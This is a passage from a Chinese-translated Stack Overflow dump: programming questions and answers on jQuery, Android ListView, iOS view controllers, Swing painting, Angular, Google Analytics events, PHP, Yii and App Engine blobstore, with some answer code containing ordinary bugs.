                    methods.play(defaults.autoPlay);
                }, 500);
            }
        },

        getFileNameWithoutExtension: function(fileName) {
            //this function take a full file name and returns an extensionless file name
            //ex. entering foo.mp3 returns foo
            //ex. entering foo returns foo (no change)
            var fileNamePieces = fileName.split('.');
            fileNamePieces.pop();
            return fileNamePieces.join(".");
        }
    };

$.fn.ubaPlayer = function(method) {
    if (methods[method]) {
        return methods[method].apply(this, Array.prototype.slice.call(arguments, 1));
    } else if (typeof method === "object" || !method) {
        return _methods.init.apply(this, arguments);
    } else {
        $.error("Method " + method + " does not exist on jquery.ubaPlayer");
    }
};})(jQuery); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-07-18T10:28:20.900

您是在谈论移动 Safari 吗？在这种情况下，根本无法使用 Javascript 设置音量。

阅读以下内容：http: [//www.ibm.com/developerworks/library/wa-ioshtml5/](http://www.ibm.com/developerworks/library/wa-ioshtml5/)

如果您在谈论桌面 Safari，我的直觉是它的浏览器在这里有问题，而不是您的代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2019-02-24T21:27:06.993

可能对您使用有帮助

*   Web Audio API [https://www.html5rocks.com/en/tutorials/webaudio/intro/](https://www.html5rocks.com/en/tutorials/webaudio/intro/)带有增益（不是音量）控制。对所有浏览器都非常统一（但是 IE 不支持）
*   在 html5/web 音频 API 之上使用抽象，例如[https://howlerjs.com/](https://howlerjs.com/)
*   我可以看到的最后一个选项 - 将您的 html5 音频传递给 WebAudio API 源并使用 JS 控制增益（您可以[在此处](https://stackoverflow.com/questions/27296391/is-there-any-possibility-to-control-html5-audio-volume-on-ios/54856004#54856004)找到更多详细信息）它与选项 #1 完全相同，但几乎不需要更改您的代码。

# arrays - JAVA - 将int数组分成n组，差异最小

> ID：15562727
> 
> 赞同：1
> 
> 时间：2013-03-22T04:26:03.383
> 
> 标签：arrays, recursion, integer, partitioning, minimum

所以我试图为一个程序找出一个算法，该算法将使用递归来获取一个 x 数的 int 数组并将其分成 n 个集合。这些数字可以是正数也可以是负数。这些集合需要在它们之间具有尽可能小的差异。

例如，如果你给程序一个 int 数组 [1, 2, 3, 4] 并告诉它分成 3 组，那么它将把它分成 [1, 3] [2] 和 [4] 之间的区别集合是 2。另一个例子是如果你给数组 [6, 6, 6, 10, 10] 并告诉它分成 2 组，那么它将分成 [10, 10] 和 [6, 6, 6]其中集合之间的差异为2。

我们可以假设数组按升序排序（左侧最小，右侧最大），因为排序将是一个简单的排序语句。有任何想法吗？

编辑：我知道我正在处理一个分区问题，我已经尝试过贪心算法，你从最大到最小的数字并将它们放在总和最低的组中，但它不适用于我上面给出的第二个示例所以我正在寻找更可靠的算法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T05:06:22.973

更一般情况（`k`集合）中的分区问题称为[最小制造跨度问题](http://en.wikipedia.org/wiki/Job_shop_scheduling)。这个问题是 NP 完全的`k > 2`。一个精确的算法，[格雷厄姆列表调度算法](http://www.risc.jku.at/education/courses/ws96/intropar/sched/index_5.html)`k = 2`，以和 而闻名`k = 3`。对于较大的尺寸，如果您不实施 NP 完全解决方案，则有[许多多项式时间逼近算法。](http://books.google.com/books?id=i3S9_GnHZwYC&lpg=PA455&ots=nCmnt7IsNs&dq=graham%20list%20scheduling&pg=PA455#v=onepage&q=graham%20list%20scheduling&f=false)

# android - 使用逻辑的 ListView 背景颜色

> ID：15562730
> 
> 赞同：1
> 
> 时间：2013-03-22T04:26:18.900
> 
> 标签：android, listview

我已经通过谷歌和stackoverflow进行了修改..

[Android - 具有 2 种不同颜色的 ListView](https://stackoverflow.com/questions/10305176/android-listview-with-2-different-colors)
我发现这篇文章对于更改背景颜色很有用.. 但是如果我想根据逻辑更改背景颜色怎么办？

例如，我的代码已经设置了一个 convertView。像下面

```
 public View getView(int position, View convertView, ViewGroup parent) { 

        if(convertView==null) 
            convertView = inflater.inflate(R.layout.rest_list, null); 

        TextView id = (TextView)convertView.findViewById(R.id.id); // title 
        TextView name = (TextView)convertView.findViewById(R.id.name); // artist name 
        TextView area = (TextView)convertView.findViewById(R.id.area); // duration 
        TextView type = (TextView)convertView.findViewById(R.id.type); // duration 
        ImageView image=(ImageView)convertView.findViewById(R.id.image); // thumb image 

        HashMap<String, String> restaurant = new HashMap<String, String>(); 
        restaurant = data.get(position); 

        // Setting all values in listview 
        if(name != null){
        id.setText(restaurant.get(RestaurantList.TAG_ID)); 
        name.setText(restaurant.get(RestaurantList.TAG_NAME)); 
        area.setText(restaurant.get(RestaurantList.TAG_AREA));
        type.setText(restaurant.get(RestaurantList.TAG_TYPE));
        imageLoader.DisplayImage(restaurant.get(RestaurantList.TAG_IMAGE), image); 
        }

    //this line is example.. 
        convertView.setBackgroundColor(position % 2 == 0 ? Color.WHITE : Color.GREEN);

    // i wanna do like this (if there is name MacDonal in NewYork , set the background to green. otherwise leave it white.

     // it gives me red underline at the 'logic operation' sentence. 
        convertView.setBackgroundColor(name == MacDonal && area == newYork ? Color.WHITE : Color.GREEN);
        return convertView; 
    } 
```

有谁知道如何解决？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:36:50.017

```
convertView.setBackgroundColor((restaurant.get(RestaurantList.TAG_NAME).equals("MacDonal") && restaurant.get(RestaurantList.TAG_AREA).equals("newYork")) ? Color.GREEN : Color.WHITE); 
```

我不知道你是否理解这里使用的三元运算符。告诉我你是否需要解释

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T04:38:52.607

使用类似类别的东西。例如：如果您将某个类别作为一种颜色，将另一个类别作为一种颜色，则定义`int category1 = 1`和`category2 = 2`。并覆盖 getview 方法。那么你的适配器可能是

```
@Override
public View getView(int position, View convertView, ViewGroup parent) {
View v = convertView;
if (v == null) {
LayoutInflater vi = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
v = vi.inflate(R.layout.list, null);
}
TextView text = (TextView) v.findViewById(R.id.text);
if (category1 == 1)
    text.setTextColor(Color.GREEN);
if (category2 == 2)
    text.setTextColor(Color.RED);
return super.getView(position, v, parent);
} 
```

我希望这对你有用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T05:17:50.750

这可能会对您有所帮助，根据需要在您的适配器 setTextcolor,Backgroundcolor

```
 public View getView(int position, View view, ViewGroup parent) {
        ViewHolder holder;
        if(view == null)
        {           
            view = inflater.inflate(R.layout.myfriends_item, null); 
            holder =  new ViewHolder();
            holder.performerImage = (ImageView)view.findViewById(R.id.mfitem_iv);
            holder.performerStar = (ImageView)view.findViewById(R.id.star);
            holder.performerName = (TextView)view.findViewById(R.id.mfitem_tv_name);

            holder.performerAge = (TextView)view.findViewById(R.id.mfitem_tv_age);
            holder.performerPoints = (TextView)view.findViewById(R.id.mfitem_tv_pts);

            holder.performStatus = (TextView)view.findViewById(R.id.mfitem_tv_status);

            holder.performLookingfor = (TextView)view.findViewById(R.id.mfitem_tv_lookingfor);
            holder.txtid = (TextView)view.findViewById(R.id.txtid);     
            view.setTag(holder);
        }
        else
        {
            holder = (ViewHolder)view.getTag();
        }       

           //here you can set color as per require
            try
            {                                                                                           

                if(topPerformersSetGet.getPerformerDataSetGets().get(position).getOnline() == 1)
                {
                    holder.performStatus.setText(HotSpotSettings.ONLINE);   
                    holder.performStatus.setTextColor(mContext.getResources().getColor(R.color.green));
                }
                else
                {
                    holder.performStatus.setText(HotSpotSettings.OFFLINE);
                    holder.performStatus.setTextColor(mContext.getResources().getColor(R.color.clrred));

                }           

            }catch(Exception ex)
            {
                ex.printStackTrace();
            }                       

            return view;
    }

    class ViewHolder
    {
        ImageView performerImage;
        ImageView performerStar;
        ImageView perforonlinestatus;       
        TextView performerName;
        TextView performStatus;     
        TextView performerAge;
        TextView performLookingfor;
        TextView performerPoints;
        TextView txtid; 
    } 
```

# ios - 获取 TableView 的 CustomCell 中的 UIViewController

> ID：15562732
> 
> 赞同：1
> 
> 时间：2013-03-22T04:26:29.253
> 
> 标签：ios, objective-c, uitableview

我有一个`UIViewController`名为“MainView”，另一个`UITableView`名为“tblLists”
`tblLists`生成`customCell`-“customCellList”。

我的问题是我可以在课堂上获得`MainView`'s instance(self) 吗？`customCellList`

我尝试了 superview 的东西，但没有得到`MainView`。我想在没有协议的情况下实现这一点。

所以需要你的帮助。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-23T22:39:26.983

您可以使用响应者链来访问视图控制器。假设您的 customCell 类是 UITableViewCell 子类，以下方法应该可以完成这项工作：

```
@implementation customCell

- (UIViewController *)getViewController
{
   id vc = [self nextResponder];
   while(![vc isKindOfClass:[UIViewController class]] && vc!=nil)
   {
       vc = [vc nextResponder];
   }

   return vc;
}

@end 
```

以上代码由[Sensible TableView](http://sensiblecocoa.com)框架提供。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-22T06:59:58.637

你问的不是一个好主意，你应该找到另一种方法。它打破了 MCV 模式。顺便说一句，如果您担心使用 ARC 并针对 iOS>=5 的内存问题，您可以创建对表视图本身的弱引用并将视图控制器作为其委托或数据源属性（当然，如果 VC 是其中之一他们）。或者，您可以创建对 VC 本身的弱引用。
正如评论中指出的那样，这不是一个好主意，最好找到另一种方法。如果您需要更新单元格值，有很多方法可以重新加载 tableview 数据！通过在模型中的 VC 上使用 KVO、通知、委托等，您可以简单地触发重新加载到表视图，而不会涉及单元格中的奇怪引用。
希望这可以帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-12-18T13:17:59.820

对于那些你想打破 MVC 的罕见情况。这假设你正在使用导航控制器作为窗口上的 rootVC。为 Swift 2 更新

```
func visibleVC() -> UIViewController? {
        if let navVC: UINavigationController = UIApplication.sharedApplication().keyWindow?.rootViewController as? UINavigationController {
            if let vc: UIViewController = navVC.visibleViewController as? MyViewControllerClass {
                return vc
            }
        }
        return nil
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-07-01T13:55:47.920

您还可以访问 rootViewController：

```
UIViewController *controller = [UIApplication sharedApplication].keyWindow.rootViewController; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-05-21T04:45:29.747

我有类似的问题，我的情况是当`textfield`Table View 自定义单元格中的值更改时更改 View Controller 中的数组。

`UITextFiled`我的解决方案是在`cellForRowAt`方法中添加委托`tableview`，然后我可以在`textFieldDidEndEditing`方法中更改所有数据。因为他们都在一个班级，`ViewController`班级。

# objective-c - 如果键盘已经显示，我如何获得它？

> ID：15562736
> 
> 赞同：1
> 
> 时间：2013-03-22T04:26:43.027
> 
> 标签：objective-c, cocoa-touch

我有一个自定义`UITextField`类，它需要在显示后抓取键盘的矩形。所以，在课堂上我听`UIKeyboardWillShowNotification`并从`UIKeyboardFrameEndUserInfoKey`. 如果当前未显示键盘，这将非常有用。但是，如果键盘已经显示 - 例如当您在文本字段之间点击时 -`UIKeyboardWillShowNotification`只会在第一个被点击的文本字段时触发。对于所有其他文本字段，我无法知道键盘的 rect 是什么。

*关于在键盘显示后*如何获得键盘的 rect 有什么建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T05:36:23.473

给你`AppDelegate`一个`keyboardFrame`财产。进行适当的`AppDelegate`观察`UIKeyboardWillShowNotification`和`UIKeyboardWillHideNotification`更新属性。将属性设置`CGRectNull`为隐藏键盘时，或添加单独的`keyboardIsShowing`属性。（您可以测试`CGRectNull`使用该`CGRectIsNull`功能。）

然后任何对象都可以使用这个咒语随时检查键盘框架：

```
[[UIApplication sharedApplication].delegate keyboardFrame] 
```

如果您不想将其放入您的应用程序委托中，您可以创建一个单独的单例类，例如

```
@interface KeyboardProxy

+ (KeyboardProxy *)sharedProxy;

@property (nonatomic, readonly) CGRect frame;
@property (nonatomic, readonly) BOOL visible;

@end

@implementation KeyboardProxy

#pragma mark - Public API

+ (KeyboardProxy *)sharedProxy {
    static dispatch_once_t once;
    static KeyboardProxy *theProxy;
    dispatch_once(&once, ^{
        theProxy = [[self alloc] init];
    });
    return theProxy;
}

@synthesize frame = _frame;

- (BOOL)visible {
    return CGRectIsNull(self.frame);
}

#pragma mark - Implementation details

- (id)init {
    if (self = [super init]) {
        _frame = CGRectNull;
        [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(keyboardWillShow:) name:UIKeyboardWillShowNotification object:nil];
        [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(keyboardWillHide:) name:UIKeyboardWillHideNotification object:nil];
    }
    return self;
}

- (void)keyboardWillShow:(NSNotification *)note {
    _frame = [note.userInfo[UIKeyboardFrameEndUserInfoKey] CGRectValue];
}

- (void)keyboardWillHide:(NSNotification *)note {
    _frame = CGRectNull;
}

@end 
```

但是如果你使用一个单独的单例，你需要确保`[KeyboardProxy sharedProxy]`从你的应用代理调用，`application:didFinishLaunchingWithOptions:`这样单例就不会错过任何通知。

# c# - 自动完成下拉列表突出显示部分文本 (WPF)

> ID：15562737
> 
> 赞同：1
> 
> 时间：2013-03-22T04:26:53.490
> 
> 标签：c#, wpf, xaml, autocompletebox

我在 WPF 应用程序中使用标准的 AutoCompleteBox 控件，用户在其中键入查询，并在键入时构建和过滤自动完成列表。在下拉列表中，我想突出显示与用户输入的文本匹配的每个列表框项中的文本。例如，如果他们键入 ap 并且下拉菜单中有 dap 和 apple，那么每个单词中的 ap 将是粗体，而其余文本不会是粗体。

我有所有代码可以将正确的文本实际更改为粗体，但我永远无法在正确的时间调用它。我找不到正确的事件来调用代码进行加粗。为了进行加粗，我遍历 VisualTreeHelper 以在每个 ListBoxItem 中找到每个 TextBlock，但我找不到正确的事件来触发此遍历。我总是在显示整个列表之前或在它被过滤之前调用它，因此粗体文本永远不会显示。

我知道我的代码有效，因为如果我从列表框选择更改事件中调用遍历，它会正确地加粗文本，但这不是我正在寻找的交互，因为用户必须突出显示一个条目才能看到粗体文本。

我可以处理什么事件并从中调用此遍历，以便在过滤和显示列表之后？请注意，每次用户在搜索框中输入另一个字符时，都会重新过滤该列表。

感谢您的帮助，因为这让我难以置信！

# rest - 无法从骆驼路由中获得输出

> ID：15562739
> 
> 赞同：1
> 
> 时间：2013-03-22T04:27:09.843
> 
> 标签：rest, cxf, apache-camel, cxfrs

我已经用骆驼路线定义了骆驼上下文，并且我有以下代码。

```
from("jetty:http://localhost:9090/camelcxfdemo/rest/cxf/camelRouter?matchOnUriPrefix=true").
    to("jetty:http://localhost:9090/camelcxfdemo/rest/cxf/getPersonData?bridgeEndpoint=true&throwExceptionOnFailure=false")
    .to("jetty:http://localhost:9090/camelcxfdemo/rest/cxf/processPersonData?bridgeEndpoint=true&throwExceptionOnFailure=false")
    .to("log:output"); 
```

上面显示的所有三个 url 都是 Rest 服务，它接受一些 post xml 并返回 xml 响应。

我希望我的骆驼路由器在调用 /camelRouter 时开始工作，它的输出应该转到 /getPersonData url，而 /getPersonData 的输出转到 /processPersonData。对于用户，我最终应该显示 /processPersonData 的输出。

所以每个 url 都依赖于它以前的 urls 输出。

但问题是当我调用 /camelRouter url 时，我总是得到 /camelRouter 响应，而不是最终输出。输出不是从一项服务路由到另一项服务。

那么我的代码中有任何问题吗？希望得到一些帮助。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-25T16:32:53.397

在我看来，Jetty 组件可以用作生产者或消费者，但不能同时用作您似乎试图使用它的两者。

# java - 事件监听器冻结 (Java)

> ID：15562740
> 
> 赞同：1
> 
> 时间：2013-03-22T04:27:17.593
> 
> 标签：java, swing, jframe

好吧，我的问题是当您拖动鼠标时 mouseMoved 被冻结，这是 MouseMotionListener （ mouseMoved 和 mouseDragged ）中的方法之一。我想也许 mouseDragged 正在冻结 mouseMoved，如果有人可以帮助我使其不会那样做，那将非常棒。

```
import javax.swing.JFrame;
import java.awt.Graphics;
import java.awt.Image;
import java.awt.event.MouseMotionListener;
import java.awt.event.MouseEvent;
import java.awt.Rectangle;
import java.lang.Runnable;
import java.awt.RenderingHints;
import java.awt.Graphics2D;
import java.awt.Color;

public class Window extends JFrame implements MouseMotionListener, Runnable {
    protected static int xWindow = 640;
    protected static int yWindow = 480;
    private Image dbi;
    private Graphics dbg;
    private int xMouse;
    private int yMouse;

    public void paint( Graphics g ) {
        dbi = createImage( getWidth(), getHeight() );
        dbg = dbi.getGraphics();
        paintComponent( dbg );
        g.drawImage( dbi, 0, 0, this );
    }

    public void paintComponent( Graphics g ) {
        Graphics2D g2d = ( Graphics2D ) g;
        g2d.setRenderingHint( RenderingHints.KEY_TEXT_ANTIALIASING, RenderingHints.VALUE_TEXT_ANTIALIAS_ON );
        g2d.setColor( Color.RED );
        g2d.drawString( "Mouse X: " + xMouse + " | Y: " + yMouse, 15, 40 );

        repaint();
    }

    public void mouseDragged( MouseEvent e ) {
        e.consume();
    }

    public void mouseMoved( MouseEvent e ) {
        xMouse = e.getX();
        yMouse = e.getY();
        e.consume();
    }

    public void run() {
        while ( true ) {
            try {
                Thread.sleep( 1 );
            } catch( Exception e ) {
                e.printStackTrace();
            }
        }
    }

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T12:53:52.090

您正在调用which`repaint`导致`paintComponent`以下方法调用链无限重复：

```
paint -> (manual call to) paintComponent 
```

要利用 Swing 优化的绘制模型，最好不要在顶级容器中进行自定义绘制，例如`JFrame`. 将所有绘制功能提取到一个新的`JComponent`或`JPanel`基于的类并覆盖`paintComponent`. Swing 将调用`paintComponent`，`repaint`因此无需直接调用。别忘了打电话`super.paintComponent(g)`。

`repaint`从内部调用`mouseMoved`。

也不要调用`Thread.sleep`，这会阻塞`EDT`并导致 UI 冻结。Swing 提供了自己的[并发对象](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/index.html)，例如[Swing Timers](http://docs.oracle.com/javase/tutorial/uiswing/misc/timer.html)。

# javascript - 如何：Angular.js 中不同对象类型的自定义 HTML 片段？

> ID：15562741
> 
> 赞同：0
> 
> 时间：2013-03-22T04:27:25.393
> 
> 标签：javascript, knockout.js, angularjs, angularjs-directive

我在尝试将一个软件从 Knockout.js 转换为 Angular.js 时遇到了一点问题

假设我从数据库返回了以下数据：

```
{
    id: "Some ID",
    title: "Some Template",
    fields: [
        {type: "radio", title="Some Title", description: "Some Description},
        {type: "textbox", title="Some Title", description: "Some Description},
        {type: "radio", title="Some Title", description: "Some Description}
    ]
} 
```

在 Knockout.js 中，我可以简单地创建 if 语句，允许我像这样放入适当的 html：

```
<!-- ko foreach: $parent.myData.fields -->
    <!-- ko if: $data.type === "textbox" !-->
        <input type="textbox" id="whatever" />
    <!-- /ko -->
<!-- /ko --> 
```

我不知道如何在 Angular 中复制上述行为。我会使用自定义指令吗？如果是这样，它将如何构建？

目前我正在尝试类似的东西：

```
<div ng-repeat="field in review.fields">
    <div class="review-temp-left">
        <div class="title">{{ field.title }}</div>
        <div class="desc">{{ field.description }}</div>
    </div>
    <div class="review-temp-right">
    <!-- NEED TO MAKE THIS AREA LOAD APPROPRIATE HTML FOR INPUT TYPE -->
    </div>
</div> 
```

任何帮助将非常感激。

谢谢，

阿里克

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T16:01:45.003

正如评论中所讨论的，[ng-switch](http://docs.angularjs.org/api/ng.directive%3angSwitch)可用于将适当的 HTML 内容添加到 DOM，基于`type`.

请注意，ng-show/ng-hide 目前并不像 ng-switch 那样从 DOM 中添加/删除内容——它们只操纵 CSS 属性来隐藏/显示 DOM 内容。

# javascript - 了解如何填充 Google Analytics 事件跟踪值

> ID：15562743
> 
> 赞同：2
> 
> 时间：2013-03-22T04:27:34.610
> 
> 标签：javascript, google-analytics

我正在尝试跟踪我的网络应用程序中的某些值。例如，我想知道某个文本区域中有多少行...

我正在尝试使用`_trackEvent(category, action, opt_label, opt_value, opt_noninteraction)` （[https://developers.google.com/analytics/devguides/collection/gajs/eventTrackerGuide](https://developers.google.com/analytics/devguides/collection/gajs/eventTrackerGuide)）

但我有点困惑如何恰当地填充这些值。类别会类似于“用户数据”吗？动作或标签是“行数”吗？如何填充这些值，以便以后可以在 Google Analytics 中最好地“使用”数据？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-27T04:18:28.547

### 类别

类别只是顶级分组。在这种情况下，它可能类似于`"Textarea"`.

### 行动

“Action”是二级数据点；它实际上不必是一个动作。如果您只想跟踪行数，则可以调用它`"Row Count"`（这可以允许将其他与 textarea 相关的指标分组到同一类别中）。

### 标签（可选）

假设您想将其作为自己的单位和数值进行跟踪。

因此，您可以将标签设置为字符串，例如`"12 rows"`.

### 价值（选择）

您可以将值设置为仅数值，例如`12`- 这将为您提供总值和平均值。

### 非交互？（选择。）

最后，由于这不跟踪交互，您不希望它影响跳出率，因此您将`opt_noninteraction`标志设置为`true`。

## 结果

所有这些最终看起来像：

```
var row_count = jQuery('textarea').html().split("\n").length; //or something like this
_gaq.push(["_trackEvent", "Textarea", "Row Count", row_count + " rows", row_count, true ]); 
```

# url - 大写文件夹 store yii 总是返回索引

> ID：15562746
> 
> 赞同：0
> 
> 时间：2013-03-22T04:27:59.620
> 
> 标签：url, yii, uppercase

我已经创建了一个 Yii 应用程序。我将它存储在 /testyii

我创建并重写了 URL。一切正常。

但是现在，当我尝试通过 localhost/Testyii/about（大写字母 T）访问时

它总是让我回到索引。当我通过 localhost/testyii/about 访问时没关系

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T07:24:50.393

在组件 urlManager 添加这个

```
'caseSensitive'=>false 
```

# php - 为 MYSQL 数据创建自动独立链接

> ID：15562748
> 
> 赞同：0
> 
> 时间：2013-03-22T04:28:32.987
> 
> 标签：php, mysql, hyperlink, http-post, httprequest

我创建了一个关于移动价格的网页。在首页上，我给出了手机的外观和型号以及“详细信息”按钮。它在 details.php 页面上提交手机的 ID。它显示数据良好，没有任何问题。该链接看起来像这样“www.eeeee.com/details.php”。但我想将链接显示为“www.eeee.com/details.php?brand=nokia&id=1111”。我怎样才能做到这一点？请帮我...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T05:11:49.613

如果您使用简单的表单来执行此操作，则可以使用简单的 get 方法而不是 post。但是如果你想手动创建你的 url，你需要使用这样的表单。

```
 <form  method="get" name="MobileDetails">
  <input name="brand" id="brand" value="<?php echo $brand;?>" type="hidden">
  <input name="brid" id="brid" value="<?php echo $brandid;?>" type="hidden">
   <button type="button" name="submitButton" value="get Details" onclick="getDetails()">    
 </form> 
```

你的代码的javascript就像

```
<script type="text/javascript">
function getDetails(){
var brand = document.getElementById('brand').value;
var brandid = document.getElementById('brid').value;
document.MobileDetails.action = 'details.php?brand='+brand+'&id='+brandid;
document.MobileDetails.submit();
}
</script> 
```

你也可以通过使用 ajax 来做到这一点，这完全是你的选择。

# jquery - jquery addClass 到多个链接

> ID：15562755
> 
> 赞同：1
> 
> 时间：2013-03-22T04:29:50.053
> 
> 标签：jquery, hyperlink, addclass

有什么办法可以将Class添加到多个链接？我有两个不同的 div 包含相同的链接集；单击链接应将相同的类应用于另一个 div 集中的“等效”链接。

```
<style>
.one{margin:70px 0}
.one a{ margin:10px; padding:5px 10px; background-color:green; text-decoration: none; color:white}
.selected{background-color: yellow;}
</style>
<div class="one">
<a href="#first">1</a><a href="#second">2</a><a href="#third">3</a>
</div>

<div class="two">
<a href="#first">1</a><a href="#second">2</a><a href="#third">3</a>
</div>
<script>
$("a.one").click(function() {
    $(this).addClass(".selected").filter(':first').click();
});
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T05:01:55.567

I would try to introduce something in common with all the links that must change together. In this I introduced a class to identify them:

```
<style>
.one{margin:70px 0}
.one a{ margin:10px; padding:5px 10px; background-color:green; text-decoration: none; color:white}
.selected{background-color: yellow;}
</style>
<div class="one">
<a href="#first" class="1">1</a><a href="#second" class="2">2</a><a href="#third" class="3">3</a>
</div>

<div class="two">
<a href="#first" class="1">1</a><a href="#second" class="2">2</a><a href="#third" class="3">3</a>
</div>
<script>
    $(document).ready(function() {
        $("a.1").click(function() {
            $("a.1").addClass("selected");
            $("a:not(.1)").removeClass("selected");
        });
        $("a.2").click(function () {
            $("a.2").addClass("selected");
            $("a:not(.2)").removeClass("selected");
        });
       $("a.3").click(function () {
            $("a.3").addClass("selected");
            $("a:not(.3)").removeClass("selected");
        });
    });
    </script> 
```

Note: if the browser you are targetting does not support css3 you can't rely on :not selector and I should use some "old style" methods to remove the class.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T04:34:51.427

此代码将帮助您...

```
$("a").addClass(".selected"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T04:38:22.623

[**关联**](http://jsfiddle.net/VA8uM/2/)

首先，您需要找到锚的索引。然后根据该索引在第二个 div 锚中应用类。

```
$('.two').children('a').eq($('.one a').index(this)).addClass('selected');

 $('.one').children('a').eq($('.two a').index(this)).addClass('selected'); 
```

# twitter-bootstrap - Sammy.js + Bootstrap 崩溃

> ID：15562762
> 
> 赞同：0
> 
> 时间：2013-03-22T04:30:17.593
> 
> 标签：twitter-bootstrap, sammy.js

我在现场使用 Sammy.js，当我刷新 (ctrl+f5) 时，总是显示崩溃 (Bootstrap)。一些代码：HTML

```
 <h5><a class="subCat-h5" data-toggle="collapse-next" title="{{Page}}">{{subCat}}</a></h5>
 <div class="collapse"> 
```

萨米.js

```
 this.get("#!/page/:page", function() {
    var page = this.params['page'];
    $('#premain').empty();
    this.render('templates/main.mustache', {"contentId":page})
                .replace("#main");
        $('.triple-div').removeClass('active-menu');
            $('#menu_' + page).addClass('active-menu');
        $('h5').next().collapse('hide');    
        $('.active-menu:contains(Черный металлопрокат)').each(function(){$('h5:contains(Черный металлопрокат)').next().collapse('show')});
        $('.active-menu:contains(Нержавеющий металлопрокат)').each(function(){$('h5:contains(Нержавеющий металлопрокат)').next().collapse('show')});
        $('.active-menu:contains(Цветной металлопрокат)').each(function(){$('h5:contains(Цветной металлопрокат)').next().collapse('show')}); 
```

您可以在 m-chel.ru 上看到它

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-24T11:05:25.840

答：需要补充：

```
$(".collapse").collapse({toggle: false}); 
```

前：

```
$('h5').next().collapse('hide'); 
```

一切都好。

# php - 如何在PHP中的字符串中获取第二个特定单词

> ID：15562770
> 
> 赞同：0
> 
> 时间：2013-03-22T04:31:02.780
> 
> 标签：php

大家好，我有一个问题，

假设有人放`"Hi lets have #fun and than more #fun"`现在假设我想获取第二个标签，包括与之相连的单词并将其存储到变量中。

我将如何获得第二部分，因为 using`(strpos($a,'#fun')`只会返回第一部分。

感谢您的时间！

大卫

编辑：

这是我所做的：

```
$code = "Hi lets have #funfgs and than more #funny";
$pos1 = strpos($code, '#');
$pos2 = strpos($code, '#', $pos1 + strlen('#'));
echo substr($code, $pos2); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:35:50.417

您可以使用以下正则表达式

```
$code = "Hi lets have #fun and than more #fun";

$pattern = "$#[^\s]*$i";

preg_match_all($pattern, $code, $matches);

print_r($matches); 
```

# android - 通过应用程序引擎端点 api 提供 blobstore 图像

> ID：15562771
> 
> 赞同：6
> 
> 时间：2013-03-22T04:31:16.957
> 
> 标签：android, google-app-engine, python-2.7, blobstore, google-cloud-endpoints

我正在构建一个应用程序引擎端点 api，它从用户（android 应用程序）获取图片并以编程方式将其保存到 blobstore。然后我将 blob_key 保存在我的数据存储中。代码如下：

*   首先，我通过 my `@endpoint.method`as收到图像`messages.BytesField`：

    image_data = messages.BytesField(1, required=True)

然后我像这样保存到 blobstore：

```
from google.appengine.api import files

def save_image(data):
  # Create the file
  file_name = files.blobstore.create(mime_type='image/png')

  # Open the file and write to it
  with files.open(file_name, 'a') as f:
    f.write('data')

  # Finalize the file. Do this before attempting to read it.
  files.finalize(file_name)

  # Get the file's blob key
  blob_key = files.blobstore.get_blob_key(file_name)
  return blob_key # which is then saved to datastore 
```

现在我想返回图像。我看不到如何将以下代码放入我的端点 api：

```
from google.appengine.ext import blobstore
from google.appengine.ext.webapp import blobstore_handlers
class ServeHandler(blobstore_handlers.BlobstoreDownloadHandler):
  def get(self, resource):
    resource = str(urllib.unquote(resource))
    blob_info = blobstore.BlobInfo.get(resource)
    self.send_blob(blob_info) 
```

最后，我想象一个这样的服务程序：

*   在@endpoints.method 中：

*   从数据存储中获取 blob_key

*   使用 blob_key 获取图像

*   将图像添加到 StuffResponseMessage

*   将 StuffResponseMessage 发送到前端（android 应用）

我的做法是因为我想保护我的用户的隐私。关于如何做好这件事的任何想法？[我的代码片段通常来自谷歌开发者教程](https://developers.google.com/appengine/docs/python/blobstore/overview)。

* * *

编辑：

我看不到如何将 blob_key 从数据存储传递到以下方法来检索图像：

```
from google.appengine.ext import blobstore
from google.appengine.ext.webapp import blobstore_handlers
class ServeHandler(blobstore_handlers.BlobstoreDownloadHandler):
  def get(self, resource):
    resource = str(urllib.unquote(resource))
    blob_info = blobstore.BlobInfo.get(resource)
    self.send_blob(blob_info) 
```

到底里面是什么`resource`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-23T19:17:43.633

我相信您想要作为字符串服务`resource`的对象是从 url 路径中检索的。`BlobKey`如果您查看`google.appengine.ext.blobstore.BlobInfo`该`get`方法的源代码，则使用一个接受对象或字符串`__normalize_and_convert_keys`参数的函数。`BlobKey`

如果 blob 是图像，则最好将服务 url 发送到您的 Android 应用程序，`StuffResponseMessage` 在您的情况下。来自谷歌的 Serving a Blob 文档：

> 如果您要提供图像，一种更高效且成本可能更低的方法是使用App Engine Images API 而不是 send_blob来使用[get_serving_url 。](https://developers.google.com/appengine/docs/python/images/functions#Image_get_serving_url)get_serving_url 函数可让您直接提供图像，而无需通过您的 App Engine 实例。

